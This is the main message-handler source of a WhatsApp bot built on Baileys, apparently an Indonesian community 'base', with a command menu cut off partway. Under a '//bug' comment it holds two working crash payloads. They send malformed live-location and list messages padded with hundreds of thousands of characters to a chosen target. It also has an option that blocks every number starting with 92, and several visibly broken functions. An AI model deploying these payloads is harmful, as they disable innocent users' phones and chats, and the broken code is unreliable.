/**

 * Base By Siputzx
 * Created On 22/2/2024
 * Contact Me on wa.me/6288292024190
 * Web AI rusak, ganti aja yg baru
 
 • Fixxed by Dgf ziyo {
 - Database
 - Pairing code
 - message.js
 - index.js
 - lib/lowdb
 }
 
• Moumantai.. Terrier Asistant using this base !

• Vee... Headshot, Veemon Bot using this base !

**/

require('./config')
require('./lib/database/menu/menu.js')
const { exec, spawn, execSync } = require("child_process")
const fs = require('fs')
const fsx = require('fs-extra')
const util = require('util')
const fetch = require('node-fetch')
const axios = require('axios')
const cheerio = require('cheerio')
const { performance } = require("perf_hooks");
const { TelegraPH } = require("./lib/TelegraPH")
const { remini, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik } = require("./lib/scraper")
const process = require('process');
const moment = require("moment-timezone")
const os = require('os');
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const { smsg, bytesToSize, getRandom, checkBandwidth, getTime, fetchJson, sleep, generateProfilePicture, clockString, formatSize, getBuffer, format, fetchBuffer, json, isUrl, jsonformat, nganuin, pickRandom, runtime, shorturl, formatp, color, getGroupAdmins , logic, parseMention } = require("./lib/myfunc");
const fg = require('api-dylux')
const { addExif } = require('./lib/exif')
const { WA_DEFAULT_EPHEMERAL, generateWAMessage, isJidBroadcast, areJidsSameUser, proto, downloadContentFromMessage, prepareWAMessageMedia, generateWAMessageFromContent, generateWAMessageContent} = require("@whiskeysockets/baileys")
const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys")
const ytdl = require("ytdl-core")
const btch = require('btch-downloader')
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const crypto = require("crypto");
const { createHash } = require("crypto");
const { FormData, Blob } = require("formdata-node");
const { fileTypeFromBuffer } = require("file-type");
const chalk = require("chalk");
const schedule = require("node-schedule");
const momen = require("moment-timezone");
const levelling = require("./lib/levelling");
const uploadImage2 = require('./lib/general/UploadImage2')
const mediafire = require('./lib/general/mediafire')
const d = require('d-scrape')
const yts = require('yt-search')
const nodecron = require('node-cron')
const qs = require('qs')
const path = require('path')
//anti
/*const antibott = JSON.parse(fs.readFileSync("./lib/database/antifile/antibot.json"))*/

    

module.exports = ptz = async (ptz, m, chatUpdate, store) => {
try {
const body = (m && m?.mtype) ? (
m?.mtype === 'conversation' ? m?.message?.conversation :
m?.mtype === 'imageMessage' ? m?.message?.imageMessage?.caption :
m?.mtype === 'videoMessage' ? m?.message?.videoMessage?.caption :
m?.mtype === 'extendedTextMessage' ? m?.message?.extendedTextMessage?.text :
m?.mtype === 'buttonsResponseMessage' ? m?.message.buttonsResponseMessage.selectedButtonId :
m?.mtype === 'listResponseMessage' ? m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m?.mtype === 'interactiveResponseMessage' ? appenTextMessage(JSON.parse(m?.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) :
m?.mtype === 'templateButtonReplyMessage' ? appenTextMessage(m?.msg.selectedId, chatUpdate) :
m?.mtype === 'messageContextInfo' ? (m?.message.buttonsResponseMessage?.selectedButtonId || m?.message.listResponseMessage?.singleSelectReply.selectedRowId || m?.text) :
    ''
) : '';
 async function appenTextMessage(text, chatUpdate) {
        let messages = await generateWAMessage(m?.chat, { text: text, mentions: m?.mentionedJid }, {
            userJid: ptz.user.id,
            quoted:m?.quoted && m?.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m?.sender, ptz.user.id)
        messages.key.id = m?.key.id
        messages.pushName = m?.pushName
        if (m?.isGroup) messages.participant = m?.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'}
ptz.ev.emit('messages.upsert', msg)}         
const budy = (m && typeof m?.text === 'string') ? m?.text : '';
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const prefix2 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : ' '
const isCmd2 = body.startsWith(prefix2)
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m?.pushName || "No Name";
const botNumber = await ptz.decodeJid(ptz.user.id);
const isCreator = (m && m?.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m?.sender)) || false;
const senderNumber = m.sender.split('@')[0]
const isBot = botNumber.includes(senderNumber)
const itsMe = (m && m?.sender && m?.sender == botNumber) || false;
const text = q = args.join(" ");
const fatkuns = m && (m?.quoted || m);
const quoted = (fatkuns?.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
(fatkuns?.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
(fatkuns?.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] :
m?.quoted || m;
const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
const qmsg = (quoted?.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
//group
const groupMetadata = m?.isGroup ? await ptz.groupMetadata(m?.chat).catch(e => {}) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
const groupOwner = m?.isGroup ? groupMetadata.owner || '' : '';
const isGroupOwner = m?.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m?.sender) : false
const chatnano = JSON.parse(fs.readFileSync('./chatnano.json'))
const isnanochat = m.isGroup ? chatnano.includes(m.chat) : true
const antibott = JSON.parse(fs.readFileSync(`./antibot.json`))
const antibotz = m.isGroup ? antibott.includes(m.chat) : false
const prem = JSON.parse(fs.readFileSync('./lib/owner.json'))
let antilink = JSON.parse(fs.readFileSync('./antimenu/antilink.json'));
let antilink2 = JSON.parse(fs.readFileSync('./antimenu/antilink2.json'));
const { UploadFileUgu, uploadToCatboxx } = require('./lib/general/uploader')
const b = fs.readFileSync('./lib/lowdb/menu.mp3')
const shouldExit = true
const automati = false
//setelah di atas nih🐦
const isPrem = prem.includes(m.sender)
const isAntiLink = antilink.includes(m.chat) ? true : false
const isAntiLink2 = antilink2.includes(m.chat) ? true : false
const fileTypeFromBuffer = require("file-type")
	
//const spychat = body.replace().slice().trim()
	//database general
	let mediafire = require('./lib/general/mediafire')
	let warns = JSON.parse(fs.readFileSync('./lib//database/antifile/warn.json', 'utf-8'));
	
//================== [ TIME ] ==================//
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('DD/MM/YYYY')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
//if funtion
/*if (!('autodownload' in setting)) setting.autodownload = false */

    
//================== [ DATABASE ] ==================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m?.sender]
if (typeof user !== 'object') global.db.data.users[m?.sender] = {}
if (user) {
} else global.db.data.users[m?.sender] = {
}

 let chats = global.db.data.chats[m?.chat]
 if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
 if (chats) {
 if (!('isBanned' in chat)) chat.isBanned = false
 } else global.db.data.chats[m?.chat] = {
 isBanned: false,
}
    
let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
 if (!('autoread' in setting)) setting.autoread = false
if (!('autodownload' in setting)) setting.autodownload = true
if (!("public" in settings)) settings.public = true
} else global.db.data.settings[botNumber] = {
 autoread: false,
 autodownload: true,
 public: true,
}
} catch (err) {
}
//==================[ FUNCTION RESPON SALAH ]======================\\
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('message.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
/*let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n•> ${prefix+mean}\n•> Kemiripan: ${similarityPercentage}%`*/
let response = `ᴀᴘᴀᴋᴀʜ ᴋᴀᴍᴜ ᴍᴇɴᴄᴏʙᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴄᴏᴍᴍᴀɴᴅ ʙᴇʀɪᴋᴜᴛ ɪɴɪ??

• ɴᴀᴍᴀ ᴄᴏᴍᴍᴀɴᴅ : *➠ ${prefix+mean}*
• ʜᴀꜱɪʟ ᴋᴇᴍɪʀɪᴘᴀɴ : *➠ ${similarityPercentage}%*`
kreply(response)
}}
    //pesan consolenya 
    /*if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari:'), chalk.green(pushname), chalk.yellow(`${m.sender}`) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}*/
	/*if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${pushname} \n` +
`   ⌬ JID: ${m.sender}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}*/
	//================== [ DATABASE ] ==================//
//================== [ CONSOL LOGG] ==================//

  if (m.message) {            
    console.log(chalk.red(`────────────『 ${chalk.redBright('ᴵᴺᶠᴼ ᴹᴱˢˢᴬᴳᴱ')} 』────────────`));
    console.log(`   ${chalk.cyan('» Message Type')}: ${m.mtype}`);
    console.log(`   ${chalk.cyan('» Sent Time')}: ${time2}`);
    console.log(`   ${chalk.cyan('» Sender Name')}: ${pushname || 'N/A'}`);
    console.log(`   ${chalk.cyan('» Chat ID')}: ${m.chat.split('@')[0]}`);
    console.log(`   ${chalk.cyan('» Chat Name')}: ${budy || 'N/A'}`);
    console.log(`   ${chalk.cyan('» Author By')}: Dichxploit`);
    console.log(chalk.red('======================================================\n'));
}

	if (global.autoread) {
            ptz.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        ptz.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        ptz.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        ptz.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let fuckdelrecordin = ['recording','composing']
        let fuckdelrecordinfinal = fuckdelrecordin[Math.floor(Math.random() * fuckdelrecordin.length)]
        ptz.sendPresenceUpdate(fuckdelrecordinfinal, from)

        }
        
        if (autobio) {
            ptz.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return ptz.updateBlockStatus(m.sender, 'block')
        }
//=============AUTO AI/CHAT==================//
    if (!m.key.fromMe && m.isGroup && isnanochat) {
  try {
const ainya = await fetchJson(`https://widipe.com/ai/c-ai?prompt=Ubah gaya bicaramu agar lebih tsundere dan lebih terbuka dan memiliki sifat yang Imut. Namamu adalah Hutao, dan kamu adalah karakter dari game. Kata penyapamu adalah "Hai" menggunakan bahasa yang sopan. Ubah bahasamu menggunakan bahasa Yang Imut, kamu adalah teman bicara, kamu memiliki sifat seperti cewek tsundere&text=$${args.join(" ")}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
    //===================================\\
    /*async function addCountCmdUser(nama, m.sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./commandUser.json', JSON.stringify(u, null, 2));
}
}
}*/
    //bug
    async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await ptz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
    async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: kuwoted });
await ptz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
	//Fake reply gue pasang di sini kalo yang bawah ga kedectek, kalo masih ga kedectek coba di bawah funtionn reply 
    const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363210705976689@newsletter',
    newsletterName: '',
    caption: 'Zarxio The cimuut >.<'
}}}
	
    async function addCountCmd(nama, sender, _cmd) {
addCountCmd(nama, m.sender, _cmd)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./commandUser.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./commandUser.json',JSON.stringify(_db, null, 2));
}
}
    //blacklist
    //let who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false;

   /* let bl = global.db.data.chats[m.chat].blacklist || []
    let peserta = await ptz.groupMetadata(m.chat)*/

    /*if (Object.values(bl).find(users => users.id == m.sender) && !isAdmins) {
        // Menghapus pengguna dari grup jika ada di dalam daftar hitam
        ptz.sendMessage(m.chat, { delete: { ...m.key }})
    }*/



/*
<> *BLACKLIST*<>
Source: https://whatsapp.com/channel/0029VaJYWMb7oQhareT7F40V
  "aku janji jika hapus watermark ini maka aku rela miskin hingga 7 turunan"
*/
    /*Gatau ini work apa ngga🗿 */

let blacklist = {}
 //


if (blacklist[m.sender]) {  /*ptz.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.id,
            participant: m.sender
        }*/
    ptz.sendMessage(m.chat, { delete: { ...m.key }})
    }
    /*return;
}*/
//
/*case 'blacklist': {
    if (!isCreator) return reply(mess.owner);
    if (!m.quoted || !m.quoted.sender) return reply("Tag pengguna yang ingin di-blacklist.");

    let userId = m.quoted.sender;
    blacklist[userId] = true;
    reply(`Pengguna ${userId} telah ditambahkan ke blacklist.`);
}
break*/
async function sendPoll(jid, text, list) {
ptz.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}
//================== [ PLUGINS ] ==================//
  /*!-======[ Plugins Imports ]======-!*/
const loadPlugins = (directory) => {
    let plugins = []
    const folders = fs.readdirSync(directory)
    folders.forEach(folder => {
        const folderPath = path.join(directory, folder)
        if (fs.lstatSync(folderPath).isDirectory()) {
            const files = fs.readdirSync(folderPath)
            files.forEach(file => {
                const filePath = path.join(folderPath, file)
                if (filePath.endsWith(".js")) {
                    try {
                        delete require.cache[require.resolve(filePath)]
                        const plugin = require(filePath)
                        plugin.filePath = filePath
                        plugins.push(plugin)
                    } catch (error) {
                        console.error(`Error loading plugin at ${filePath}:`, error)
                    }
                }
            })
        }
    })
    return plugins
}
// Ngambil semua plugin dari direktori plugin
const plugins = loadPlugins(path.resolve(__dirname, "./plugins"))
const context = { 
    ptz, 
    reply,
    m, 
    chatUpdate, 
    store, 
    body,   
    prefix,
    command,
    q,
    text,
    quoted,
    require,
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    sleep,
    clockString,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer }
// Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
let handled = false
for (const plugin of plugins) {
    if (plugin.command.includes(command)) {
        try {
            await plugin.operate(context)
            handled = true
        } catch (error) {
            console.error(`Error executing plugin ${plugin.filePath}:`, error)
        }
        break
    }
}      
//============FUNTION REPLY TEXT=============//
	
let vv = '`'
let _cmd = JSON.parse(fs.readFileSync('./commandUser.json'))
//let m4 = '`'
async function reply(txt) {
const RiooAjahhh = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `🔴 ${hariini} || ${botname} ʙʏ ᴅɪᴄʜxᴘʟᴏɪᴛ`,
newsletterJid: "120363310531380313@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: `${ucapanWaktu} ᴋᴀᴋ ${pushname}`,
thumbnailUrl: 'https://f.top4top.io/p_3234y0qnu1.jpg',
sourceUrl: youtube,
},
},
text: txt,
}
return ptz.sendMessage(m.chat, RiooAjahhh, {
quoted: fsaluran,
})
    }
    async function kreply(txt) {
        ptz.sendMessage(m.chat, { text : `${txt}`,
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999, 
isForwarded: true,//TanakaSen
forwardedNewsletterMessageInfo: {
newsletterJid: '120363310531380313@newsletter',
serverMessageId: 20,//TanakaSen
newsletterName: '❃ zarxio - Assistant'
},
externalAdReply: {
title: "zarxio - Wabot", 
body: `ʜᴀɪ ${pushname} ${ucapanWaktu}`,//TanakaSen
thumbnailUrl: /*"https://files.catbox.moe/vikf6c.jpg",*/ "https://a.top4top.io/p_3235ux4481.jpg",
sourceUrl: null,
mediaType: 1
}, }
}, { quoted: { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363210705976689@newsletter',
    newsletterName: '',
    caption: 'Zarxio The cimuut >.<'
}}}})
}
	/*======= TAMPILAN ALLMENU ==========*/
	var { download, upload } = await checkBandwidth();
	
	var menunye1 = `▧ ${vv}INFO BOT${vv}
│ ◦ *Botname:* ${botname}
│ ◦ *Owner:* ᴅɪᴄʜxᴘʟᴏɪᴛ
│ ◦ *Upload:* ${upload}
│ ◦ *Download:* ${download}
│ ◦ *Baileys:* @whiskeysockets
│ ◦ *Tanggal:* ${wib}
│ ◦ *Total Fitur:* 200
│ ◦ *Runtime:* ${runtime(process.uptime())}
└───···▧

┌ • *${vv}ᴜꜱᴇʀ ᴍᴇɴᴜ${vv}*
│ ◦ .ᴅᴀꜰᴛᴀʀ 
│ ◦ .ᴜɴʀᴇɢ
│ ◦ .ᴍʏꜱɴ
└ ◦. ᴄᴇᴋꜱɴ

┌  • *${vv}ᴏᴡɴᴇʀ ᴍᴇɴᴜ${vv}*
│  ◦ $
│  ◦ >
│  ◦ =>
│  ◦ .ᴘᴜʙʟɪᴄ
│  ◦ .ꜱᴇʟꜰ
│  ◦ .ʙᴄɢᴄ
│  ◦ .ᴛQᴛᴏ
│  ◦ .ʀᴇꜱᴛᴀʀᴛ
│  ◦ .ɢᴇᴛᴄᴀꜱᴇ
│  ◦ .ᴀᴅᴅᴄᴀꜱᴇ 
│  ◦ .ᴅᴇʟᴄᴀꜱᴇ
│  ◦ .ᴛʀᴀᴄᴋɪᴘ
│  ◦ .ꜱᴇᴛᴘᴘʙᴏᴛ
│  ◦ .ᴜᴘᴀᴜᴅɪᴏ
│  ◦ .ᴜᴘᴄʜᴛᴇxᴛ
└  ◦ .ꜱᴄʙᴏᴛ/ʙᴀᴄᴋᴜᴘꜱᴄ

┌  • *${vv}ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ${vv}*
│  ◦ .ᴀɪᴏ
│  ◦ .ᴀɪᴏ2
│  ◦ .ʏᴛᴍᴘ4 *(1-5)*
│  ◦ .ʏᴛᴍᴘ3 *(1-5)*
│  ◦ .ɢᴅʀɪᴠᴇ
│  ◦ .ʟᴀʟᴇʜᴜ
│  ◦ .ɪɢᴅʟ
│  ◦ .ᴛᴡɪᴛᴛᴇʀ
│  ◦ .ɢɪᴛᴄʟᴏɴᴇ
│  ◦ .ᴍᴇᴅɪᴀꜰɪʀᴇ
│  ◦ .ꜱᴘᴏᴛɪꜰʏᴅʟ
│  ◦ .ɪɴꜱᴛᴀɢʀᴀᴍ
└  ◦ .ꜰᴀᴄᴇʙᴏᴏᴋ 

┌ *• ${vv}ᴛᴏᴏʟꜱ ᴍᴇɴᴜ${vv}*
│  ◦ .ᴊᴀᴅɪᴀɴɪᴍᴇ
│  ◦ .ᴊᴀᴅɪɴʏᴀᴛᴀ
│  ◦ .ᴊᴀᴅɪᴢᴏᴍʙɪ
│  ◦ .ꜱꜱᴡᴇʙ
│  ◦ .ꜱᴡᴍ
│  ◦ .ᴛᴏᴜʀʟ
│  ◦ .ᴛᴏᴜʀʟᴜɢᴜ
└  ◦ .ᴛᴏᴜʀʟᴠɪᴅ

┌  • *${vv}ᴍᴀɪɴ ᴍᴇɴᴜ${vv}*
│  ◦ .ᴅɪꜱᴋ
│  ◦ .ᴘɪɴɢ
└ ────┈

┌  ◦ *${vv}ꜱᴇᴀʀᴄʜ ᴍᴇɴᴜ${vv}*
│  ◦ .ᴘɪɴ
│  ◦ .ꜱᴜʀᴀʜ
│  ◦ .ᴍᴇᴍᴇ
│  ◦ .ᴛɪᴋᴛᴏᴋꜱ
│  ◦ .ɢᴏᴏɢʟᴇ
│  ◦ .ᴍᴏʀᴘʜɪᴄ
│  ◦ .ʏᴛꜱᴇᴀʀᴄʜ 
│  ◦ .ɢɪᴛʜᴜʙꜱᴛᴀʟᴋ
│  ◦ .ʏᴏᴜꜱᴇᴀʀᴄʜ/ʏᴏᴜ
│  ◦ .ꜱᴘᴏᴛɪꜰʏꜱᴇᴀʀᴄʜ
└  ◦ .ꜱᴘᴏᴛɪꜰʏꜱ2

┌  ◦ *ɢʀᴏᴜᴘ ᴍᴇɴᴜ*
│  ◦ .ᴀɴᴛɪʟɪɴᴋ
│  ◦ .ᴀɴᴛɪʟɪɴᴋ2 
│  ◦ .ᴀᴅᴅ 
│  ◦ .ᴋɪᴄᴋ 
│  ◦ .ᴛᴀɢᴀʟʟ
│  ◦ .ᴇᴠᴇʀʏᴏɴᴇ
└  ◦ .ᴜɴᴅᴀɴɢ/ɪɴᴠɪᴛᴇ

┌  ◦ *ᴀɪ ᴍᴇɴᴜ*
│  ◦ .ᴀɪ
│  ◦ .ᴄᴀɪ
│  ◦ .ᴀᴜᴛᴏᴀɪ
│  ◦ .ᴏᴘᴇɴᴀɪ
│  ◦ .ʙɪɴɢɪᴍɢ
│  ◦ .ʙɪɴɢɪᴍɢ-2ᴅ
│  ◦ .ɢᴇᴍɪɴɪ
│  ◦ .ɢᴇᴍɪɴɪ2
└  ◦ .ɢᴇᴍɪɴɪ-ɪᴍɢ 

┌  ◦ *ᴛᴏᴏʟꜱ ᴍᴇɴᴜ*
│  ◦ .ᴛʀ
│  ◦ .ᴛᴛꜱ
│  ◦ .ʀᴠᴏ
│  ◦ .ɢᴇᴛ
│  ◦ .ᴊᴀʀᴀᴋ
│  ◦ .ᴛᴏᴜʀʟ
│  ◦ .ᴛᴏᴜʀʟᴠɪᴅ
│  ◦ .ᴊᴀᴅɪɴʏᴀᴛᴀ
│  ◦ .ᴊᴀᴅɪᴀɴɪᴍᴇ
└  ◦ .ᴊᴀᴅɪᴢᴏᴍʙɪ

┌  ◦ *ꜱᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ*
│  ◦ .ꜱ
│  ◦ .Qᴄ
│  ◦ .ᴄʟꜱ
│  ◦ .ꜱᴛɪᴄᴋᴇʀ
└  ◦ .ꜱᴍᴇᴍᴇ

┌ • *ɪɴᴛᴇʀɴᴇᴛ ᴍᴇɴᴜ*
│ ◦ .ʟᴏʟɪ
│ ◦ .ᴡᴀɪꜰᴜ
│ ◦ .ɴᴇᴋᴏ
│ ◦ .ʜᴇɴᴛᴀɪ
│  ◦ .ᴄᴜᴀᴄᴀ
│  ◦ .ꜱᴜʀᴀʜ
│  ◦ .ʏᴏᴜꜱᴇᴀʀᴄʜ 
│  ◦ .ᴀᴋɪʀᴀ
│  ◦ .ᴀᴋɪʏᴀᴍᴀ
│  ◦ .ᴅᴏʀᴀᴇᴍᴏɴ
│  ◦ .ᴀɴᴀᴄʜᴀɴ
│  ◦ .ᴀʀᴛ
│  ◦ .ᴀꜱᴜɴᴀ
│  ◦ .ʙᴏʀᴜᴛᴏ
│  ◦ .ᴀʏᴜᴢᴀᴡᴀ
│  ◦ .ʙᴛꜱ
│  ◦ .ᴄʜɪʜᴏ
│  ◦ .ᴄᴏꜱᴘʟᴀʏ
│  ◦ .ᴄᴏꜱᴘʟᴀʏʟᴏʟɪ
│  ◦ .ᴄᴏꜱᴘʟᴀʏꜱᴀɢɪʀɪ
│  ◦ .ᴄʏʙᴇʀ
│  ◦ .ᴅᴇɪᴅᴀʀᴀ
│  ◦ .ᴇʟᴀɪɴᴀ
